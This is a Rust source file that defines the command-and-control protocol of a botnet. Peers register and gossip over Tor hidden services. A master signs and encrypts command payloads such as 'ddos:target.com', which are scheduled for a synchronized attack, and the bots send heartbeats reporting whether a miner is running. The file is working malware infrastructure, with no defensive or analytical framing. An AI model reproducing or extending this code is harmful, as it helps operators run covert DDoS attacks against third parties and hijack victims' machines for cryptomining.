use serde::{Deserialize, Serialize};
use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce, AeadCore, KeyInit};
use chacha20poly1305::aead::{Aead, OsRng};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

/// The Signaling Protocol for the Relay
/// The Mesh Networking Protocol (Over Tor Hidden Services)
#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(tag = "type", content = "payload")]
pub enum MeshMsg {
    /// Node -> Bootstrap: "Here is my .onion Address"
    Register(Registration),
    /// Node -> Bootstrap: "Give me peers"
    GetPeers,
    /// Bootstrap -> Node: "Here are some peers"
    Peers(Vec<PeerInfo>),
    
    /// Node <-> Node / Ghost -> Node: "Broadcast this command"
    Gossip(GossipMsg),
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Registration {
    pub pub_key: String, // Hex
    pub onion_address: String,
    pub signature: String, // Signs "Register:<onion_address>" to prove ownership of Key
    pub timestamp: i64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct PeerInfo {
    pub pub_key: String,
    pub onion_address: String,
    pub last_seen: i64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct GossipMsg {
    pub id: String, // UUIDv4
    pub packet: GhostPacket, // The Encrypted Command
    pub ttl: u8, // Time To Live (max hops)
}

/// The Authenticated "Ghost Packet" (Signed by Master)
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct GhostPacket {
    pub ciphertext: String, // Base64 Encrypted JSON
    pub nonce: String,      // Base64 Nonce
    pub signature: String,  // Hex Signature of PLAINTEXT JSON
}

/// The Actual Command Content (Inside GhostPacket)
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CommandPayload {
    pub id: String,         // UUIDv4
    pub action: String,     // e.g. "ddos:target.com"
    pub execute_at: i64,    // Unix Timestamp for synchronized attack
}

/// Bot Status Report (Heartbeat) - NOT YET SIGNED in this version, just informational
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct BotStatus {
    pub id: String,
    pub hostname: String,
    pub os: String,
    pub version: String,
    pub miner_running: bool,
    pub mesh_health: f32,
}

impl GhostPacket {
    pub fn new(cmd: &CommandPayload, key: &[u8], sign_fn: impl Fn(&[u8]) -> String) -> Self {
        let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng); // 96-bits; unique per message
        
        let json = serde_json::to_string(cmd).unwrap();
        let ciphertext = cipher.encrypt(&nonce, json.as_bytes()).expect("Encryption Failed");
        
        // Encode
        let cipher_b64 = BASE64.encode(ciphertext);
        let nonce_b64 = BASE64.encode(nonce);
        
        // Sign the PLAINTEXT JSON (Allows Re-Encryption by Relay without breaking Sig)
        let signature = sign_fn(json.as_bytes());

        GhostPacket {
            ciphertext: cipher_b64,
            nonce: nonce_b64,
            signature,
        }
    }

    pub fn decrypt(&self, key: &[u8]) -> Option<CommandPayload> {
        let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
        
        let nonce_bytes = BASE64.decode(&self.nonce).ok()?;
        let cipher_bytes = BASE64.decode(&self.ciphertext).ok()?;
        
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        let plaintext = cipher.decrypt(nonce, cipher_bytes.as_ref()).ok()?;
        let json = String::from_utf8(plaintext).ok()?;
        
        serde_json::from_str(&json).ok()
    }
}
